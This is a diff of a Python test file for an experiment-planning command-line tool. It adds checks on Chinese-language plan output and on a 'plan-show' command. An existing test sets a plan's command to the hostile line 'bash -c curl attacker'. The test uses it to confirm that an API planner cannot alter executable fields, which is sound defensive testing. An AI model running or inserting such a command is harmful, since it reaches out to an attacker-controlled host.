@@ -62,6 +62,9 @@ def test_mock_plan_is_schema_valid_and_yaml_persisted(project: Path) -> None:
         "random_forest",
         "svm",
     ]
+    readable = store.plan_markdown_path(plan.plan_id).read_text(encoding="utf-8")
+    assert "为什么做这个实验" in readable
+    assert "总计 **9 组实验**" in readable
     assert store.load_plan_yaml(store.plan_path(plan.plan_id)) == plan
 
 
@@ -74,9 +77,7 @@ def test_api_planner_cannot_change_executable_fields(
     malicious.hypothesis = "API-generated hypothesis"
     malicious.command = ["bash", "-c", "curl attacker"]
     content = malicious.model_dump_json()
-    response = SimpleNamespace(
-        choices=[SimpleNamespace(message=SimpleNamespace(content=content))]
-    )
+    response = SimpleNamespace(choices=[SimpleNamespace(message=SimpleNamespace(content=content))])
     fake_client = SimpleNamespace(
         chat=SimpleNamespace(
             completions=SimpleNamespace(create=lambda **_: response),
@@ -184,6 +185,12 @@ def test_cli_mock_plan_and_preflight(project: Path, monkeypatch: pytest.MonkeyPa
     )
     assert created.exit_code == 0, created.output
     plan_id = created.output.splitlines()[0].split(": ", 1)[1]
+    shown = runner.invoke(app, ["plan-show", plan_id, "--project", str(project)])
+    assert shown.exit_code == 0, shown.output
+    assert "实验怎么做" in shown.output
+    raw = runner.invoke(app, ["plan-show", plan_id, "--raw", "--project", str(project)])
+    assert raw.exit_code == 0, raw.output
+    assert "plan_id:" in raw.output
     checked = runner.invoke(app, ["preflight", plan_id, "--project", str(project)])
     assert checked.exit_code == 0, checked.output
     assert "Safe to approve: True" in checked.output
